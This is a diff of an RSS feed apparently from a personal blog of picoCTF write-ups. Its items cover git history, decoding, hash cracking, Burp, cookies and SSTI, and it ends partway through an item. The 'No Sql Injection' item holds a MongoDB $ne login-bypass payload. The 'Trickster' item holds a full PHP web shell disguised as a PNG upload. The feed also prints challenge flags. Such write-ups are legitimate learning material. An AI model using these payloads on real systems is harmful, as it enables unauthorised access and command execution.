@@ -1,1 +1,621 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>Jhagan Cyber Blog</title><link>https://jhagan-cyber-blog.pages.dev/</link><description>Recent content on Jhagan Cyber Blog</description><generator>Hugo</generator><language>en-us</language><lastBuildDate/><atom:link href="https://jhagan-cyber-blog.pages.dev/index.xml" rel="self" type="application/rss+xml"/></channel></rss>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
+  <channel>
+    <title>Jhagan Dutt on NullByte Notes</title>
+    <link>http://localhost:1313/</link>
+    <description>Recent content in Jhagan Dutt on NullByte Notes</description>
+    <generator>Hugo</generator>
+    <language>en-us</language>
+    <lastBuildDate>Fri, 05 Jun 2026 00:00:00 +0000</lastBuildDate>
+    <atom:link href="http://localhost:1313/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title># binary search</title>
+      <link>http://localhost:1313/writeups/picoctf/pico-2024/binary-search/</link>
+      <pubDate>Fri, 05 Jun 2026 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/writeups/picoctf/pico-2024/binary-search/</guid>
+      <description>&lt;hr&gt;
+&lt;h1 id=&#34;description&#34;&gt;Description:&lt;/h1&gt;
+&lt;p&gt;Want to play a game? As you use more of the shell, you might be interested in how they work!&lt;/p&gt;
+&lt;p&gt;Binary search is a classic algorithm used to quickly find an item in a sorted list.
+Can you find the flag? You&amp;rsquo;ll have 1000 possibilities and only 10 guesses.&lt;/p&gt;
+&lt;p&gt;Cyber security often has a huge amount of data to look through - from logs, vulnerability reports,
+and forensics. Practicing the fundamentals manually might help you in the future when you have to
+write your own tools!&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title># binhexa</title>
+      <link>http://localhost:1313/writeups/picoctf/pico-2024/binhexa/</link>
+      <pubDate>Fri, 05 Jun 2026 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/writeups/picoctf/pico-2024/binhexa/</guid>
+      <description>&lt;hr&gt;
+&lt;h1 id=&#34;description&#34;&gt;description&lt;/h1&gt;
+&lt;p&gt;How well can you perfom basic binary operations?&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;┌──(root㉿Harsh)-[/home/jhagan/h/drop-in]
+└─# nc titan.picoctf.net 57549
+
+Welcome to the Binary Challenge!&amp;#34;
+Your task is to perform the unique operations in the given order and find the final result in hexadecimal that yields the flag.
+
+Binary Number 1: 00011110
+Binary Number 2: 00110010
+
+
+Question 1/6:
+Operation 1: &amp;#39;&amp;gt;&amp;gt;&amp;#39;
+Perform a right shift of Binary Number 2 by 1 bits .
+Enter the binary result: 00011001
+Correct!
+
+Question 2/6:
+Operation 2: &amp;#39;&amp;amp;&amp;#39;
+Perform the operation on Binary Number 1&amp;amp;2.
+Enter the binary result: 00010010
+Correct!
+
+Question 3/6:
+Operation 3: &amp;#39;+&amp;#39;
+Perform the operation on Binary Number 1&amp;amp;2.
+Enter the binary result: 01010000
+Correct!
+
+Question 4/6:
+Operation 4: &amp;#39;*&amp;#39;
+Perform the operation on Binary Number 1&amp;amp;2.
+Enter the binary result: 10111011100
+Correct!
+
+Question 5/6:
+Operation 5: &amp;#39;&amp;lt;&amp;lt;&amp;#39;
+Perform a left shift of Binary Number 1 by 1 bits.
+Enter the binary result: 00111100
+Correct!
+
+Question 6/6:
+Operation 6: &amp;#39;|&amp;#39;
+Perform the operation on Binary Number 1&amp;amp;2.
+Enter the binary result: 00111110
+Correct!
+
+Enter the results of the last operation in hexadecimal: 0x3E
+
+Correct answer!
+The flag is: picoCTF{b1tw^3se_0p3eR@tI0n_su33essFuL_1367e2c6}
+&lt;/code&gt;&lt;/pre&gt;</description>
+    </item>
+    <item>
+      <title># bookmarket</title>
+      <link>http://localhost:1313/writeups/picoctf/pico-2024/bookmarklet/</link>
+      <pubDate>Fri, 05 Jun 2026 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/writeups/picoctf/pico-2024/bookmarklet/</guid>
+      <description>&lt;hr&gt;
+&lt;h1 id=&#34;description&#34;&gt;Description&lt;/h1&gt;
+&lt;p&gt;Why search for the flag when I can make a bookmarklet
+to print it for me?
+Browse here, and find the flag!&lt;/p&gt;
+&lt;h3 id=&#34;-whats-a-bookmarklet&#34;&gt;🔍 What’s a bookmarklet?&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;A bookmarklet is like a small program you save as a bookmark in your browser.&lt;/li&gt;
+&lt;li&gt;Instead of going to a normal website when you click it, it runs JavaScript code.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h1 id=&#34;solution&#34;&gt;solution&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;copy the java script code and run the code in the java script compiler. this will give you the flag&lt;/li&gt;
+&lt;li&gt;make a bookmark and edit the url and paste the Javascriptcode and save it . run the bookmark this give you flag&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;-conclusion&#34;&gt;✅ Conclusion:&lt;/h2&gt;
+&lt;p&gt;The challenge teaches that sometimes the solution is just running the code you’re given instead of overthinking or searching the whole site. The flag is revealed when the bookmarklet runs.&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title># Collaborative Development</title>
+      <link>http://localhost:1313/writeups/picoctf/pico-2024/collaborative-development/</link>
+      <pubDate>Fri, 05 Jun 2026 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/writeups/picoctf/pico-2024/collaborative-development/</guid>
+      <description>&lt;hr&gt;
+&lt;p&gt;#Description
+My team has been working very hard on new features for our flag printing program! I wonder how they&amp;rsquo;ll work together?
+You can download the challenge files here:
+challenge.zip&lt;/p&gt;
+&lt;h1 id=&#34;solution&#34;&gt;solution&lt;/h1&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;wget https://artifacts.picoctf.net/c_titan/177/challenge.zip
+unzip challenge.zip
+cd drop-in/
+git branch -a
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;this will show all branch&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;git checkout   feature/part-1
+cat flag.py
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;┌──(root㉿Harsh)-[/home/jhagan/drop-in/drop-in]&lt;br&gt;
+└─# cat flag.py&lt;br&gt;
+print(&amp;ldquo;Printing the flag&amp;hellip;&amp;rdquo;)&lt;br&gt;
+print(&amp;ldquo;picoCTF{t3@mw0rk_&amp;rdquo;, end=&amp;rsquo;&#39;)&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;git checkout   feature/part-2
+cat flag
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;┌──(root㉿Harsh)-[/home/jhagan/drop-in/drop-in]&lt;br&gt;
+└─# cat flag.py&lt;br&gt;
+print(&amp;ldquo;Printing the flag&amp;hellip;&amp;rdquo;)&lt;/p&gt;
+&lt;p&gt;print(&amp;ldquo;m@k3s_th3_dr3@m_&amp;rdquo;, end=&amp;rsquo;&#39;)&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title># Commitment Issues</title>
+      <link>http://localhost:1313/writeups/picoctf/pico-2024/commitment-issues/</link>
+      <pubDate>Fri, 05 Jun 2026 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/writeups/picoctf/pico-2024/commitment-issues/</guid>
+      <description>&lt;hr&gt;
+&lt;p&gt;&lt;code&gt;ls -la&lt;/code&gt;
+This shows .git exists → proof it’s a Git repo.&lt;/p&gt;
+&lt;p&gt;Check commit history&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;┌──(root㉿Harsh)-[/home/jhagan/drop-in]
+└─# git log
+commit 8dc51806c760dfdbb34b33a2008926d3d8e8ad49 (HEAD -&amp;gt; master)
+Author: picoCTF &amp;lt;ops@picoctf.com&amp;gt;
+Date:   Tue Mar 12 00:06:17 2024 +0000
+
+    remove sensitive info
+
+commit 87b85d7dfb839b077678611280fa023d76e017b8
+Author: picoCTF &amp;lt;ops@picoctf.com&amp;gt;
+Date:   Tue Mar 12 00:06:17 2024 +0000
+
+    create flag
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This shows a list of commits.
+You notice one commit message says &amp;ldquo;create flag&amp;rdquo; — that’s when the flag was added.&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title># cookie monster secret recipe</title>
+      <link>http://localhost:1313/writeups/picoctf/pico-2025/cookie-monster-secret-recipe/</link>
+      <pubDate>Fri, 05 Jun 2026 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/writeups/picoctf/pico-2025/cookie-monster-secret-recipe/</guid>
+      <description>&lt;hr&gt;
+&lt;h1 id=&#34;description&#34;&gt;Description&lt;/h1&gt;
+&lt;p&gt;Cookie Monster has hidden his top-secret cookie recipe somewhere on his website. As an aspiring cookie detective, your mission is to uncover this delectable secret. Can you outsmart Cookie Monster and find the hidden recipe?
+You can access the Cookie Monster here and good luck&lt;/p&gt;
+&lt;h2 id=&#34;solution&#34;&gt;solution&lt;/h2&gt;
+&lt;p&gt;We should check for HTTP cookies.&lt;/p&gt;
+&lt;p&gt;Check the cookies&lt;br&gt;
+Start DevTools in the browser by pressing F12 or using Ctrl + Shift + I.&lt;br&gt;
+Then select the Application tab and make sure &lt;a href=&#34;http://verbal-sleep.picoctf.net:56241&#34;&gt;http://verbal-sleep.picoctf.net:56241&lt;/a&gt; is selected under Cookies in the menu to the left.&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title># hashcrack</title>
+      <link>http://localhost:1313/writeups/picoctf/pico-2025/hashcrack/</link>
+      <pubDate>Fri, 05 Jun 2026 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/writeups/picoctf/pico-2025/hashcrack/</guid>
+      <description>&lt;hr&gt;
+&lt;h1 id=&#34;description&#34;&gt;Description&lt;/h1&gt;
+&lt;p&gt;A company stored a secret message on a server which got breached due to the admin using weakly hashed passwords. Can you gain access to the secret stored within the server?
+Access the server using nc verbal-sleep.picoctf.net 57819&lt;/p&gt;
+&lt;h1 id=&#34;solution&#34;&gt;solution&lt;/h1&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;┌──(root㉿Harsh)-[/home/jhagan]
+└─# nc verbal-sleep.picoctf.net 57819
+Welcome!! Looking For the Secret?
+
+We have identified a hash: 482c811da5d5b4bc6d497ffa98491e38
+Enter the password for identified hash: password123
+Correct! You&amp;#39;ve cracked the MD5 hash with no secret found!
+
+Flag is yet to be revealed!! Crack this hash: b7a875fc1ea228b9061041b7cec4bd3c52ab3ce3
+Enter the password for the identified hash: letmein
+Correct! You&amp;#39;ve cracked the SHA-1 hash with no secret found!
+
+Almost there!! Crack this hash: 916e8c4f79b25028c9e467f1eb8eee6d6bbdff965f9928310ad30a8d88697745
+Enter the password for the identified hash: qwerty098
+Correct! You&amp;#39;ve cracked the SHA-256 hash with a secret found.
+The flag is: picoCTF{UseStr0nG_h@shEs_&amp;amp;PaSswDs!_869e658e}
+&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
+&lt;li&gt;crack the hashes by  &lt;a href=&#34;https://crackstation.net/&#34;&gt;CrackStation&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h1 id=&#34;-1-length-of-the-hash&#34;&gt;🔍 1. Length of the Hash&lt;/h1&gt;
+&lt;p&gt;Each hashing algorithm produces a fixed-length output, typically in hexadecimal.&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title># heap-dump</title>
+      <link>http://localhost:1313/writeups/picoctf/pico-2025/head-dump/</link>
+      <pubDate>Fri, 05 Jun 2026 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/writeups/picoctf/pico-2025/head-dump/</guid>
+      <description>&lt;hr&gt;
+&lt;h1 id=&#34;-challenge-description&#34;&gt;🧩 Challenge Description&lt;/h1&gt;
+&lt;p&gt;Explore a web application and find an endpoint that exposes a file containing a hidden flag. The application is a blog where one of the articles discusses API documentation. The goal is to find a file generated from the server’s memory that contains the flag.&lt;/p&gt;
+&lt;p&gt;A heap dump is a snapshot of a program’s memory (specifically, the heap section) at a particular point in time.
+It typically contains:&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title># introtoburp</title>
+      <link>http://localhost:1313/writeups/picoctf/pico-2024/introtoburp/</link>
+      <pubDate>Fri, 05 Jun 2026 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/writeups/picoctf/pico-2024/introtoburp/</guid>
+      <description>&lt;hr&gt;
+&lt;h1 id=&#34;description&#34;&gt;Description&lt;/h1&gt;
+&lt;p&gt;Try here to find the flag&lt;/p&gt;
+&lt;h1 id=&#34;solution&#34;&gt;Solution&lt;/h1&gt;
+&lt;p&gt;Open BurpSuite and the proxy web browser with the link provided in the challenge description: &lt;a href=&#34;http://titan.picoctf.net:49297/&#34;&gt;http://titan.picoctf.net:49297/&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;For the first page, it doesn&amp;rsquo;t matter the data you put in. You could put all values to anything and then click &amp;ldquo;Register&amp;rdquo;. Now on the OTP page turn the &amp;ldquo;Intercept&amp;rdquo; function to on in BurpSuite.&lt;/p&gt;
+&lt;p&gt;Doesn&amp;rsquo;t matter what is put for OTP. In the intercept now remove the text on line &amp;ldquo;otp=&amp;rdquo; but don&amp;rsquo;t remove any spaces/lines just the text from the otp.&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title># neterencdec</title>
+      <link>http://localhost:1313/writeups/picoctf/pico-2024/nterencdec/</link>
+      <pubDate>Fri, 05 Jun 2026 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/writeups/picoctf/pico-2024/nterencdec/</guid>
+      <description>&lt;hr&gt;
+&lt;h1 id=&#34;description&#34;&gt;Description&lt;/h1&gt;
+&lt;p&gt;Can you get the real meaning from this file.
+Download the file here.&lt;/p&gt;
+&lt;h1 id=&#34;solution&#34;&gt;solution&lt;/h1&gt;
+&lt;p&gt;Base64-decoding&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;┌──(kali㉿kali)-[/mnt/…/picoCTF/picoCTF_2024/Cryptography/interencdec]
+└─$ cat enc_flag               
+YidkM0JxZGtwQlRYdHFhR3g2YUhsZmF6TnFlVGwzWVROclh6ZzJhMnd6TW1zeWZRPT0nCg==
+The padding characters (=) at the end reveals that this is likely base64-encoded data.
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Let&amp;rsquo;s decode it with base64:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;┌──(kali㉿kali)-[/mnt/…/picoCTF/picoCTF_2024/Cryptography/interencdec]
+└─$ cat enc_flag | base64 -d
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;b&amp;rsquo;d3BqdkpBTXtqaGx6aHlfazNqeTl3YTNrXzg2a2wzMmsyfQ==&#39;&lt;/p&gt;
+&lt;p&gt;Still base64-endoded but in python byte-format.&lt;br&gt;
+Another round of decoding:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;┌──(kali㉿kali)-[/mnt/…/picoCTF/picoCTF_2024/Cryptography/interencdec]
+└─$ echo &amp;#34;d3BqdkpBTXtqaGx6aHlfazNqeTl3YTNrXzg2a2wzMmsyfQ==&amp;#34; | base64 -d
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;wpjvJAM{jhlzhy_k3jy9wa3k_86kl32k2}&lt;/p&gt;
+&lt;p&gt;Now this looks like a rotation cipher like Caesar or ROT13. The caesar cipher rotates 3 positions whereas ROT13 rotates 13 positions.&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title># No Sql Injection</title>
+      <link>http://localhost:1313/writeups/picoctf/pico-2024/no-sql-injection/</link>
+      <pubDate>Fri, 05 Jun 2026 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/writeups/picoctf/pico-2024/no-sql-injection/</guid>
+      <description>&lt;hr&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;wget https://artifacts.picoctf.net/c_atlas/37/app.tar.gz
+tar -xvzf app.tar.gz 
+&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
+&lt;li&gt;open the burpsuit and login with any credentioal and interupt the network and send to repeater and edit this by :&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;#34;email&amp;#34;:&amp;#34;{\&amp;#34;$ne\&amp;#34;: \&amp;#34;null\&amp;#34;}&amp;#34;,
+&amp;#34;password&amp;#34;:&amp;#34;{\&amp;#34;$ne\&amp;#34;: \&amp;#34;null\&amp;#34;}&amp;#34;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;{&amp;ldquo;success&amp;rdquo;:true,&amp;ldquo;email&amp;rdquo;:&amp;ldquo;&lt;a href=&#34;mailto:picoplayer355@picoctf.org&#34;&gt;picoplayer355@picoctf.org&lt;/a&gt;&amp;rdquo;,&amp;ldquo;token&amp;rdquo;:&amp;ldquo;cGljb0NURntqQmhEMnk3WG9OelB2XzFZeFM5RXc1cUwwdUk2cGFzcWxfaW5qZWN0aW9uXzY3YjFhM2M4fQ==&amp;rdquo;,&amp;ldquo;firstName&amp;rdquo;:&amp;ldquo;pico&amp;rdquo;,&amp;ldquo;lastName&amp;rdquo;:&amp;ldquo;player&amp;rdquo;}&lt;/p&gt;
+&lt;p&gt;&amp;ldquo;token&amp;rdquo;:&amp;ldquo;cGljb0NURntqQmhEMnk3WG9OelB2XzFZeFM5RXc1cUwwdUk2cGFzcWxfaW5qZWN0aW9uXzY3YjFhM2M4fQ==&amp;rdquo;&lt;/p&gt;
+&lt;p&gt;picoCTF{jBhD2y7XoNzPv_1YxS9Ew5qL0uI6pasql_injection_67b1a3c8}&lt;/p&gt;
+&lt;h4 id=&#34;nonsql-injection-trick&#34;&gt;nonsql injection trick&lt;/h4&gt;
+&lt;ul&gt;
+&lt;li&gt;User:{&amp;quot;$ne&amp;quot;:&amp;ldquo;null&amp;rdquo;}  Password: {&amp;quot;$ne&amp;quot;:&amp;ldquo;null&amp;rdquo;}&lt;/li&gt;
+&lt;/ul&gt;</description>
+    </item>
+    <item>
+      <title># Scan Surprise</title>
+      <link>http://localhost:1313/writeups/picoctf/pico-2024/scan-surprise/</link>
+      <pubDate>Fri, 05 Jun 2026 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/writeups/picoctf/pico-2024/scan-surprise/</guid>
+      <description>&lt;hr&gt;
+&lt;h2 id=&#34;ive-gotten-bored-of-handing-out-flags-as-text-wouldnt-it-be-cool-if-they-were-an-image-instead&#34;&gt;I&amp;rsquo;ve gotten bored of handing out flags as text. Wouldn&amp;rsquo;t it be cool if they were an image instead?&lt;/h2&gt;
+&lt;h1 id=&#34;solution&#34;&gt;solution&lt;/h1&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1. ssh -p 64695 ctf-player@atlas.picoctf.net
+2. ls
+&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
+&lt;li&gt;you find the QR code in this&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;code&gt;3. zbarimg flag.png&lt;/code&gt;&lt;/p&gt;
+&lt;h3 id=&#34;zbar-tools-is-a-linux-package-that-lets-you-scan-and-read-barcodes-or-qr-codes-directly-from-the-command-line&#34;&gt;zbar-tools is a Linux package that lets you scan and read barcodes or QR codes directly from the command line.&lt;/h3&gt;
+&lt;h3 id=&#34;it-includes-tools-like&#34;&gt;It includes tools like:&lt;/h3&gt;
+&lt;h3 id=&#34;-zbarimg--scans-qr-codesbarcodes-from-images-png-jpg-etc&#34;&gt;✅ zbarimg → scans QR codes/barcodes from images (PNG, JPG, etc.)&lt;/h3&gt;
+&lt;h3 id=&#34;-zbarcam--scans-qr-codesbarcodes-live-from-a-webcam&#34;&gt;✅ zbarcam → scans QR codes/barcodes live from a webcam&lt;/h3&gt;</description>
+    </item>
+    <item>
+      <title># Secret of the Polyglot</title>
+      <link>http://localhost:1313/writeups/picoctf/pico-2024/secret-of-the-polyglot/</link>
+      <pubDate>Fri, 05 Jun 2026 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/writeups/picoctf/pico-2024/secret-of-the-polyglot/</guid>
+      <description>&lt;hr&gt;
+&lt;h3 id=&#34;the-network-operations-center-noc-of-your-local-institution-picked-up-a-suspicious-file-theyre-getting-conflicting-information-on-what-type-of-file-it-is-theyve-brought-you-in-as-an-external-expert-to-examine-the-file-can-you-extract-all-the-information-from-this-strange-file&#34;&gt;The Network Operations Center (NOC) of your local institution picked up a suspicious file, they&amp;rsquo;re getting conflicting information on what type of file it is. They&amp;rsquo;ve brought you in as an external expert to examine the file. Can you extract all the information from this strange file?&lt;/h3&gt;
+&lt;h1 id=&#34;solution&#34;&gt;Solution&lt;/h1&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1.  wget https://artifacts.picoctf.net/c_titan/9/flag2of2-final.pdf
+2. ls
+3. convert flag2of2-final.pdf flag2of2-final.png
+4. open flag2of2-final.png
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;picoCTF{f1u3n7_&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;5. apt install poppler-utils
+6.  pdftotext flag2of2-final.pdf
+7. cat flag2of2-final.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;1n_pn9_&amp;amp;_pdf_7f9bccd1}&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title># SSTI1</title>
+      <link>http://localhost:1313/writeups/picoctf/pico-2025/ssti1/</link>
+      <pubDate>Fri, 05 Jun 2026 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/writeups/picoctf/pico-2025/ssti1/</guid>
+      <description>&lt;hr&gt;
+&lt;h1 id=&#34;description&#34;&gt;Description:&lt;/h1&gt;
+&lt;p&gt;I made a cool website where you can announce whatever you want!
+Try it out!
+I heard templating is a cool and modular way to build web apps!
+Check out my website here!&lt;/p&gt;
+&lt;h3 id=&#34;hints&#34;&gt;Hints:&lt;/h3&gt;
+&lt;ol&gt;
+&lt;li&gt;Server Side Template Injection&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h1 id=&#34;solution&#34;&gt;Solution&lt;/h1&gt;
+&lt;p&gt;Browse to the web site and you will see a web page that includes the text&lt;/p&gt;
+&lt;h3 id=&#34;verify-ssti&#34;&gt;Verify SSTI&lt;/h3&gt;
+&lt;p&gt;The hint has already given away that the site uses &lt;a href=&#34;https://portswigger.net/web-security/server-side-template-injection&#34;&gt;server-side templates&lt;/a&gt; but we need to verify that and find out the backend technology used.&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title># Super SSH.md</title>
+      <link>http://localhost:1313/writeups/picoctf/pico-2024/super-ssh/</link>
+      <pubDate>Fri, 05 Jun 2026 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/writeups/picoctf/pico-2024/super-ssh/</guid>
+      <description>&lt;hr&gt;
+&lt;h1 id=&#34;description&#34;&gt;Description&lt;/h1&gt;
+&lt;p&gt;Using a Secure Shell (SSH) is going to be pretty important.
+Can you ssh as ctf-player to titan.picoctf.net at port 52017 to get the flag?
+You&amp;rsquo;ll also need the password 6dd28e9b. If asked, accept the fingerprint with yes.&lt;/p&gt;
+&lt;h1 id=&#34;solution&#34;&gt;solution&lt;/h1&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt; ssh -p 52017 ctf-player@titan.picoctf.net
+&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
+&lt;li&gt;ssh → Secure Shell, used to remotely log into another computer/server.&lt;/li&gt;
+&lt;li&gt;-p 52017 → Specifies a non-default port (52017 instead of the usual 22).&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;mailto:ctf-player@titan.picoctf.net&#34;&gt;ctf-player@titan.picoctf.net&lt;/a&gt; → Says:&lt;/li&gt;
+&lt;li&gt;username: ctf-player&lt;/li&gt;
+&lt;li&gt;server: titan.picoctf.net&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;after enter psd&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title># time machine</title>
+      <link>http://localhost:1313/writeups/picoctf/pico-2024/time-machine/</link>
+      <pubDate>Fri, 05 Jun 2026 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/writeups/picoctf/pico-2024/time-machine/</guid>
+      <description>&lt;hr&gt;
+&lt;h1 id=&#34;description&#34;&gt;Description&lt;/h1&gt;
+&lt;p&gt;What was I last working on? I remember writing a note to help me remember&amp;hellip;
+You can download the challenge files here:
+challenge.zip&lt;/p&gt;
+&lt;h1 id=&#34;solution&#34;&gt;solution&lt;/h1&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;wget https://artifacts.picoctf.net/c_titan/68/challenge.zip
+unzip challenge.zip
+cd drop-in/
+cat message.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;finally&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;┌──(root㉿Harsh)-[/home/jhagan/h/drop-in]
+└─# git log
+commit 705ff639b7846418603a3272ab54536e01e3dc43 (HEAD -&amp;gt; master)
+Author: picoCTF &amp;lt;ops@picoctf.com&amp;gt;
+Date:   Sat Mar 9 21:10:36 2024 +0000
+
+    picoCTF{t1m3m@ch1n3_b476ca06}
+&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;conclusion&#34;&gt;conclusion&lt;/h2&gt;
+&lt;h3 id=&#34;1-git-keeps-history--even-if-the-file-is-changed-or-deleted&#34;&gt;1. Git keeps history — even if the file is changed or deleted&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;Git records every commit (change) with:&lt;/li&gt;
+&lt;li&gt;A unique commit hash&lt;/li&gt;
+&lt;li&gt;An author and timestamp&lt;/li&gt;
+&lt;li&gt;A commit message&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Even if the file with the sensitive information is later removed or modified, the data can still be recovered by checking older commits.&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title># Trickster</title>
+      <link>http://localhost:1313/writeups/picoctf/pico-2024/trickster/</link>
+      <pubDate>Fri, 05 Jun 2026 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/writeups/picoctf/pico-2024/trickster/</guid>
+      <description>&lt;hr&gt;
+&lt;h3 id=&#34;description&#34;&gt;Description&lt;/h3&gt;
+&lt;p&gt;I found a web app that can help process images: PNG&lt;/p&gt;
+&lt;h1 id=&#34;solution&#34;&gt;solution&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;create a file with name  (untitle.png.php)&lt;/li&gt;
+&lt;li&gt;edit this file&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;PNG
+&amp;lt;html&amp;gt;
+&amp;lt;body&amp;gt;
+&amp;lt;form method=&amp;#34;GET&amp;#34; name=&amp;#34;&amp;lt;?php echo basename($_SERVER[&amp;#39;PHP_SELF&amp;#39;]); ?&amp;gt;&amp;#34;&amp;gt;
+&amp;lt;input type=&amp;#34;TEXT&amp;#34; name=&amp;#34;cmd&amp;#34; autofocus id=&amp;#34;cmd&amp;#34; size=&amp;#34;80&amp;#34;&amp;gt;
+&amp;lt;input type=&amp;#34;SUBMIT&amp;#34; value=&amp;#34;Execute&amp;#34;&amp;gt;
+&amp;lt;/form&amp;gt;
+&amp;lt;pre&amp;gt;
+&amp;lt;?php
+    if(isset($_GET[&amp;#39;cmd&amp;#39;]))
+    {
+        system($_GET[&amp;#39;cmd&amp;#39;] . &amp;#39; 2&amp;gt;&amp;amp;1&amp;#39;);
+    }
+?&amp;gt;
+&amp;lt;/pre&amp;gt;
+&amp;lt;/body&amp;gt;
+&amp;lt;/html&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
+&lt;li&gt;upload this png file and type &lt;code&gt;http://atlas.picoctf.net:58157/uploads/untitled.png.php&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;RUN&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;ls -al
+ls -al /var/www/html
+cat /var/www/html/GAZWIMLEGU2DQ.txt
+&lt;/code&gt;&lt;/pre&gt;</description>
+    </item>
+    <item>
+      <title># unminify</title>
+      <link>http://localhost:1313/writeups/picoctf/pico-2024/unminify/</link>
+      <pubDate>Fri, 05 Jun 2026 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/writeups/picoctf/pico-2024/unminify/</guid>
+      <description>&lt;hr&gt;
+&lt;p&gt;I don&amp;rsquo;t like scrolling down to read the code of my website, so I&amp;rsquo;ve squished it. As a bonus, my pages load faster!&lt;/p&gt;
+&lt;h1 id=&#34;solution&#34;&gt;solution&lt;/h1&gt;
+&lt;p&gt;&lt;code&gt;curl http://titan.picoctf.net:50120/&lt;/code&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;seeing the clear CTF in output&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;flag : class=&amp;ldquo;picoCTF{pr3tty_c0d3_dbe259ce}&amp;rdquo;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;</description>
+    </item>
+    <item>
+      <title># webdecode</title>
+      <link>http://localhost:1313/writeups/picoctf/pico-2024/webdecode/</link>
